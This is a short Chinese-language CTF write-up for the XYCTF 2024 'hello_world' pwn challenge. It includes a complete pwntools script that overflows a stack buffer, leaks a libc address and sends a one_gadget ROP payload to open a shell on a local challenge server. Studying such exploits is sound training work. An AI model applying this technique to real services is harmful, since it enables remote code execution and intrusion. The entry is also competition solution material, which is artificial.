# hello_world

> 分类：Pwn

## 题目描述
签到题。程序要求输入 name，存在栈溢出，可 leak libc 后用 one_gadget 拿 shell。

## 考察知识点
- 栈溢出
- libc 地址泄露
- one_gadget

## 解法
leak libc 然后 one gadget。

```python
from pwn import *
import os

os.chdir('./bin')
#sh = process("./vuln")
sh = remote('127.0.0.1',11027)

sh.recvuntil(b'please input your name: ')
sh.send(b'a'*(0x20+8))
sh.recvuntil(b'Welcome to XYCTF! ')
sh.recvuntil(b'a'*(0x20+8))
data = sh.recvline()[:-1]
data = data.ljust(8,b'\x00')[:8]
data = u64(data)

libc_base = data-0x29D90
print('libc_base',hex(libc_base))
one_gadget = libc_base+0xebc81
bss_addr = libc_base+0x21bbb0
ret_addr = libc_base+0x29139
print('one_gadget',hex(one_gadget))
print('bss_addr',hex(bss_addr))
sh.recvuntil(b'please input your name: ')
sh.send(b'a'*0x20+p64(bss_addr)+p64(ret_addr)+p64(one_gadget))

sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
